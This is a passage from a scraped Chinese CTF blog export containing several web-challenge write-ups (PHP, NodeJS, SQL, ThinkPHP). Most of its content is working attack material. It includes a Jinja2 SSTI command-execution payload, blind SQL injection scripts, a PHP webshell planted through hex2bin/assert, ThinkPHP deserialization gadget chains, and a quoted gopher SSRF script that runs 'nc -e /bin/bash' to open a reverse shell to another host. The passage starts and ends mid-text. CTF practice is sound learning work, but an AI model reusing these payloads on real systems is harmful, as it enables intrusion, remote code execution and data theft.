(strpos(&quot;$whitelist&quot;, $string[$i]) === false) &#123; Hacker(); &#125; &#125; if (preg_match(&quot;/$blacklist/is&quot;, $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return &quot;&quot;; &#125;&#125;function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function login($user, $pass)&#123; $user = Filter($user); $pass = md5($pass); $sql = &quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;$user&#x27; and `password_which_you_do_not_know_too` = &#x27;$pass&#x27;&quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION[&#x27;user&#x27;] = $data[username_which_you_do_not_know]; $_SESSION[&#x27;login&#x27;] = 1; $_SESSION[&#x27;isadmin&#x27;] = $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return;&#125;function updateadmin($level,$user)&#123; $sql = &quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;$level&#x27; where `username_which_you_do_not_know`=&#x27;$user&#x27; &quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) &#123; return true; &#125; else &#123; return false; &#125; return;&#125;function register($user, $pass)&#123; global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = &quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;$user&#x27;,&#x27;$pass&#x27;,&#x27;0&#x27;)&quot;; $res = sql_query($sql); return $mysqli-&gt;insert_id;&#125;function logout()&#123; session_destroy(); Header(&quot;Location: index.php&quot;);&#125;?&gt; 试着读取ffffllllaaaaggg，但是他已经过滤了，但是parse_url有问题，所以我们可以写： 1//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg 读过去发现m4aaannngggeee，再之后可以发现templates/upload.html，上传一些就能发现是个假的，但是我们可以知道有upllloadddd.php，估摸着就是没在templates这个文件夹下（说实话我不知道这有什么意义- -？） 回到user.php读取upload的代码 12345678910111213141516171819202122232425&lt;?php$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);$size = 10000000;$path = &quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;;$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];if(is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123; if(!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$path.$filename))&#123; die(&quot;error:can not move&quot;); &#125;&#125;else&#123; die(&quot;error:not an upload file锛�&quot;);&#125;$newfile = $path.$filename;echo &quot;file upload success&lt;br /&gt;&quot;;echo $filename;$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);echo &quot;&lt;img src=&#x27;data:image/png;base64,&quot;.$picdata.&quot;&#x27;&gt;&lt;/img&gt;&quot;;if($_FILES[&#x27;file&#x27;][&#x27;error&#x27;]&gt;0)&#123; unlink($newfile); die(&quot;Upload file error: &quot;);&#125;$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#x27;file&#x27;][&#x27;name&#x27;]));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125; 发现可以命令执行，于是随便上传个东西过去改文件名就可以： 发现不能用../去读取，所以用之前提到的知识点就好 读取flag得到","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"Double_Secret","slug":"Double-Secret","date":"2021-04-22T07:43:02.000Z","updated":"2021-04-22T08:07:48.743Z","comments":true,"path":"2021/04/22/Double-Secret/","link":"","permalink":"http://example.com/2021/04/22/Double-Secret/","excerpt":"","text":"Double_Secret无语，脑洞题目，需要几下的就是rc4的加密脚本 1234567891011121314151617181920212223242526272829303132333435363738import base64from urllib import parsedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):#返回加密后得内容 s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_boxdef rc4_excrypt(plain, box): res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))key = &quot;HereIsTreasure&quot; #此处为密文message = input(&quot;请输入明文:\\n&quot;)enc_base64 = rc4_main( key , message )enc_init = str(base64.b64decode(enc_base64),&#x27;utf-8&#x27;)enc_url = parse.quote(enc_init)print(&quot;rc4加密后的url编码:&quot;+enc_url)#print(&quot;rc4加密后的base64编码&quot;+enc_base64)放出：&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[],"tags":[]},{"title":"encode_and_encode","slug":"encode-and-encode","date":"2021-04-21T09:54:02.000Z","updated":"2021-04-21T09:56:01.110Z","comments":true,"path":"2021/04/21/encode-and-encode/","link":"","permalink":"http://example.com/2021/04/21/encode-and-encode/","excerpt":"","text":"题目思路：1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page);// echo $content; if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); 绕过思路： ​ 可以利用\\u 来绕过字符串限制，利用伪协议流读取文件数据","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"JSON","slug":"JSON","permalink":"http://example.com/tags/JSON/"}]},{"title":"虎符2021_InternalSystem","slug":"虎符2021-InternalSystem","date":"2021-04-05T04:04:15.000Z","updated":"2021-04-05T06:50:31.735Z","comments":true,"path":"2021/04/05/虎符2021-InternalSystem/","link":"","permalink":"http://example.com/2021/04/05/%E8%99%8E%E7%AC%A62021-InternalSystem/","excerpt":"","text":"比赛的时候完全没想到内网链接..登陆上去之后就卡住了，看了赵总的博客才懂，赵总tql! 1https:&#x2F;&#x2F;www.zhaoj.in&#x2F;read-6905.html 这道题目涉及的考点如下： NodeJS 弱类型比较 NodeJS代码审计 SSRF NodeJS8的漏洞 在/source下我们可以找到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149const express = require(&#x27;express&#x27;)const router = express.Router()const axios = require(&#x27;axios&#x27;)const isIp = require(&#x27;is-ip&#x27;)const IP = require(&#x27;ip&#x27;)const UrlParse = require(&#x27;url-parse&#x27;)const &#123;sha256, hint&#125; = require(&#x27;./utils&#x27;)const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;))const port = process.env.PORT || 3000function formatResopnse(response) &#123; if(typeof(response) !== typeof(&#x27;&#x27;)) &#123; return JSON.stringify(response) &#125; else &#123; return response &#125;&#125;function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125;const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]router.get(&#x27;/&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/index&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.render(&#x27;index&#x27;, &#123;admin: req.session.admin, network: JSON.stringify(require(&#x27;os&#x27;).networkInterfaces())&#125;) &#125;&#125;)router.get(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) &#123; res.render(&#x27;base&#x27;, &#123;title: &#x27;WAF&#x27;, content: &quot;Here is the waf...&quot;&#125;) &#125; else &#123; try &#123; const response = await axios.get(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, response.data) &#125; catch(error) &#123; res.render(&#x27;base&#x27;, error.message) &#125; &#125;&#125;)router.post(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; // test url // not implemented here const url = &quot;https://postman-echo.com/post&quot; await axios.post(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, &quot;Something needs to be implemented&quot;)&#125;)router.all(&#x27;/search&#x27;, async (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;You can only use proxy to aceess here!&#x27;&#125;) &#125; const result = &#123;title: &#x27;Search Success&#x27;, content: &#x27;&#x27;&#125; const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try &#123; if(method == &#x27;get&#x27;) &#123; const response = await axios.get(url) result.content = formatResopnse(response.data) &#125; else if(method == &#x27;post&#x27;) &#123; const response = await axios.post(url, data) result.content = formatResopnse(response.data) &#125; else &#123; result.title = &#x27;Error&#x27; result.content = &#x27;Unsupported Method&#x27; &#125; &#125; catch(error) &#123; result.title = &#x27;Error&#x27; result.content = error.message &#125; return res.json(result)&#125;)router.get(&#x27;/source&#x27;, (req, res, next)=&gt;&#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.js&quot;);&#125;)router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;)module.exports = router 登陆部分的代码如下： 12345678910111213router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;) 题目要求含有username和password强等于，同时还要求强度不等，最后还不允许username的名字不是admin。 刚开始我就卡在这里了，后来学长推测和PHP的特性一样，试了一下果然pass掉了.. 123456789101112131415161718const username = [&#x27;admin&#x27;]var password = &#x27;admin&#x27;;console.log(username.length);if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; console.log(&#x27;false&#x27;); &#125; else&#123; console.log(&#x27;yes&#x27;); &#125;//看来和PHP的特性差不多..准确来说这就是弱类型语言的特性，当两者进行比较的时候就会进行转换，同时当我们的尝试将数组和字符串组合起来的时候JS又可以正确的拼接var salt = &quot;nodejs8&quot;console.log(username+salt);//adminnodejs8","categories":[],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://example.com/tags/NodeJs/"}]},{"title":"2021虎符杯部分web","slug":"2021虎符杯部分web","date":"2021-04-03T12:31:54.000Z","updated":"2021-04-03T13:34:32.869Z","comments":true,"path":"2021/04/03/2021虎符杯部分web/","link":"","permalink":"http://example.com/2021/04/03/2021%E8%99%8E%E7%AC%A6%E6%9D%AF%E9%83%A8%E5%88%86web/","excerpt":"","text":"“慢慢做”管理系统这道题是sql和ssrf的结合，感觉还是挺有意思的。可惜自己SSRF真的菜， 第一步比较坑，这个比较难想到.. 不过好险后门给了hint： 12这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag，反正慢慢做就对了，不要急躁，静下心。第一步登录的sql语句是&quot;SELECT * FROM users WHERE password = &#x27;&quot;.md5($password,true).&quot;&#x27; limit 0,1&quot;; 那我们尝试ffifdyop，结果被过滤了，不过没事，还有另外几个payload： 1234611686052576742364e58129581926211651571912466741651878684928 随后打一个都可以。 进去之后允许我们打ssrf了， 这个提示很明显了，用gopher协议去打，可惜自己并不会ssrf【】。 看了篇这个文章，发现可以试试看这个： 123456789101112131415161718192021222324252627282930313233343536373839404142https://zhuanlan.zhihu.com/p/112055947脚本：#!/usr/bin/python# -*- coding: UTF-8 -*-import urllib2,urlliburl = &quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;header = &quot;&quot;&quot;gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1Host:192.168.0.119Content-Type:&quot;&quot;&quot;cmd = &quot;nc -e /bin/bash 192.168.0.109 6666&quot;content_type = &quot;&quot;&quot;自己填写(不要有换行)&quot;&quot;&quot;header_encoder = &quot;&quot;content_type_encoder = &quot;&quot;content_type_encoder_2 = &quot;&quot;url_char = [&quot; &quot;]nr = &quot;\\r\\n&quot;# 编码请求头for single_char in header: if single_char in url_char: header_encoder += urllib.quote(urllib.quote(single_char,&#x27;utf-8&#x27;),&#x27;utf-8&#x27;) else: header_encoder += single_charheader_encoder = header_encoder.replace(&quot;\\n&quot;,urllib.quote(urllib.quote(nr,&#x27;utf-8&#x27;),&#x27;utf-8&#x27;))# 编码content-type，第一次编码for single_char in content_type: # 先转为ASCII,在转十六进制即可变为URL编码 content_type_encoder += str(hex(ord(single_char)))content_type_encoder = content_type_encoder.replace(&quot;0x&quot;,&quot;%&quot;) + urllib.quote(nr,&#x27;utf-8&#x27;)# 编码content-type，第二次编码for single_char in content_type_encoder: # 先转为ASCII,在转十六进制即可变为URL编码 content_type_encoder_2 += str(hex(ord(single_char)))content_type_encoder_2 = content_type_encoder_2.replace(&quot;0x&quot;,&quot;%&quot;)exp = url + header_encoder + content_type_encoder_2print exprequest = urllib2.Request(exp)response = urllib2.urlopen(request).read()print response 其实会打ssrf的话这题并不是很难，跟强网杯的随便注是一个意思，直接照抄思路即可。 12345678910111213141516171819202122232425import requestsimport reimport urllib# z = &quot;username=&#123;&#125;&amp;password=123&quot;.format((# &quot;admin1&#x27;;use ctf2;rename table fake_admin to fake_admin1;rename table &quot;# &quot;real_admin_here_do_you_find to fake_admin;show tables;#&quot;))z = &quot;username=&#123;&#125;&amp;password=123&quot;.format(&quot;admin&#x27;;show databases;&quot;)# table real_admin_here_do_you_find# use ctf2;rename table real_admin_here_do_you_find to fake_admin# z=&quot;username=&#123;&#125;&amp;password=123&quot;.format((&quot;admin1&#x27;;use ctf2;desc real_admin_here_do_you_find;#&quot;))# z=&quot;username=admin&amp;password=5fb4e07de914cfc82afb44vbaf402203&quot;a = &#x27;&#x27;&#x27;POST /admin.php HTTP/1.1Host: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: &#123;&#125;&#123;&#125;&#x27;&#x27;&#x27;a = a.format(len(z), z)res = urllib.parse.quote(urllib.parse.quote(a).replace(&#x27;%0A&#x27;, &#x27;%0d%0A&#x27;))# payload = &#x27;gopher://127.0.0.1/_&#x27;+respayload = &#x27;gopher://127.0.0.1:80/_&#x27; + res + &quot;%250d%250A&quot;print(payload) 再ctf2中我们可以查看到： unsetme","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"[object Object]","slug":"object-Object","permalink":"http://example.com/tags/object-Object/"}]},{"title":"红明谷杯web","slug":"红明谷杯web","date":"2021-04-02T12:07:45.000Z","updated":"2021-05-09T13:50:53.081Z","comments":true,"path":"2021/04/02/红明谷杯web/","link":"","permalink":"http://example.com/2021/04/02/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/","excerpt":"","text":"Happysql呜呜一点也不欢乐，这个题目真的恶心心，不过不算很难，主要是很久没做SQL了卡住了很久： 一开始以为是时间盲注瞎折腾了很久，发现还没生效 1select/**/concat(rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;),rpad(1,999999,&quot;a&quot;))/**/REGEXP/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot;/**/&quot;(a.*)cd&quot; 后来才知道是双引号闭合，之后是布尔盲注。过滤挺多， 符号过滤： = | &gt; | &lt;|空格|单引号双引号 等等 关键词： or|and|mid|substr| like | ord 既然不能用 = 号的话我们可以用regexp来尝试进行绕过，需要表名的话也可以使用in来绕过，单双引号的绕过我们可以利用十六进制的特性进行绕过。 所以第一步我们的payload可以这样构造： 123&quot;||case/**/when/**/(rpad((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/in/**/(database())),26,1))regexp(0x2c2c)/**/then/**/1/**/else/**/0/**/end# 这样子我们就可以得到表名了，但是比较尴尬的是innodb_table_stats这个表没有办法获取到字段名，但是没关系，我们依然可以通过join的方法来绕过，给出payload如： 11&#39; union all select*from (select * from users as a join users b)c--+ 后续列名依然可以： 11&#39; union all select*from (select * from users as a join users b using(id,username))c--+ 最后结合regexp把payload拼出来就好： 12345678910111213141516171819202122232425262728293031323334import requestsimport string,redef str_to_hex(s): return &#x27; &#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])def hex_to_str(s): return &#x27;&#x27;.join([chr(i) for i in [int(b, 16) for b in s.split(&#x27; &#x27;)]])url = &quot;http://eci-2ze6jljai3r40l545qre.cloudeci1.ichunqiu.com/login.php&quot;flag = &quot;&quot;t=&quot;&quot;for i in range(25,80): print(i) for j in re.escape(&#x27;&#x27;&#x27;,0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;&#123;#%&amp;()-./:;&lt;=&gt;?@[\\\\]^_`|&#125;~&#x27;&#x27;&#x27;): payload=&quot;database()&quot; #ctf payload=&quot;select group_concat(table_name) from mysql.innodb_table_stats where database_name in (database())&quot; #ctf,f1ag #payload=&#x27;version()&#x27; 10.4.13-mariadb #payload=&#x27;select b from (select 1 as b union select * from f1ag)as a&#x27; payload=&#x27;select group_concat(a.1) from (select 1 union select * from f1ag) as a&#x27; data=&#123; &#x27;username&#x27;:(&#x27;wa123123&quot;||case when (rpad((&#123;&#125;),&#123;&#125;,1))regexp(0x&#123;&#125;) then 1 else 0 end#&#x27;.format(payload,i,flag+hex(ord(j)).replace(&#x27;0x&#x27;,&#x27;&#x27;))).replace(&#x27; &#x27;,&#x27;/**/&#x27;), &#x27;password&#x27;:&#x27;123&#x27; &#125; print(data)#6374662c66316167 res = requests.post(url=url, data=data)#,proxies=proxies) if &quot;&lt;meta http-equiv=&quot; in res.text: flag+=hex(ord(j)).replace(&#x27;0x&#x27;,&#x27;&#x27;) t+=j print(flag,t) break elif &#x27;injection&#x27; in res.text: print(&#x27;wrong&#x27;) exit() 这里再补充几个绕过information_schema的trick 123456?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+mysql.innodb_table_stats 绕过等号的办法： 1234select group_concat(table_name) from mysql.innodb_table_stats where database_name regexp database()select group_concat(table_name) from mysql.innodb_table_stats where database_name in (database())# 使用in的话后者必须用括号括起来 write_shell这道题反而是所有题目当中最好做的.. 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123; // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123; die(&#x27;hacker!!!&#x27;); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#x27;pwd&#x27;: echo $dir; break; case &#x27;upload&#x27;: $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt; 这题用短标签+hex2bin结合即可绕过所有过滤.. 查看phpinfo： 1?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;assert(hex2bin(&quot;00706870696e666f2829&quot;))?&gt; 发现可以用shell_exec，正好还可以用短标签输出出来 1upload&amp;data=&lt;?=assert(hex2bin(&quot;7072696e74287368656c6c5f657865632827636174202f2177686174796f7577616e74676767676767673430312e7068702729293b&quot;))?&gt; BUU上的环境有变化，直接出： 1?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;assert(hex2bin(&quot;73797374656d2822636174202f666c6c6c6c6c6c6c313131323232323232326c616722293b&quot;))?&gt; 原版本的pyaload： 1?action=upload&amp;data=&lt;?=`ls%09/`?&gt; easytp通过ThinkVERION 找到版本为3.1。百度payload， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件 ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;thinkphp3&quot;, &quot;hostname&quot; =&gt; &quot;&quot;, &quot;hostport&quot; =&gt; &quot;3307&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; 这里记一下可以读/start.sh，读取配置文件你是啥也读不到的，start.sh里面 12&#x27;\\x02#!/bin/bash\\n\\nmysqld_safe &amp;\\n\\nmysql_ready() &#123;\\n\\tmysqladmin ping --socket=/run/mysqld/mysqld.sock --user=root --password=root &gt; /dev/null 2&gt;&amp;1\\n&#125;\\n\\nwhile !(mysql_ready)\\ndo\\n\\techo &quot;waiting for mysql ...&quot;\\n\\tsleep 3\\ndone\\n\\nmysql -e &quot;ALTER USER \\&#x27;root\\&#x27;@\\&#x27;localhost\\&#x27; IDENTIFIED WITH mysql_native_password BY \\&#x27;root\\&#x27;;flush privileges;&quot; -uroot -proot\\n\\nif [[ -f /db.sql ]]; then\\n mysql -e &quot;source /db.sql&quot; -uroot -proot\\n rm -f /db.sql\\nfi\\n\\nif [[ -f /flag.sh ]]; then\\n\\tsource /flag.sh\\nfi\\n\\napache2-foreground\\n&#x27; 读到了继续下一步,读到有test库 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件 ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;mysql&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=extractvalue(0x0a,concat(0x0a,(select substr((select group_concat(schema_name) from information_schema.SCHEMATA),50,90) )))#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; 查到列是flag，表是flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件 ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;test&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); 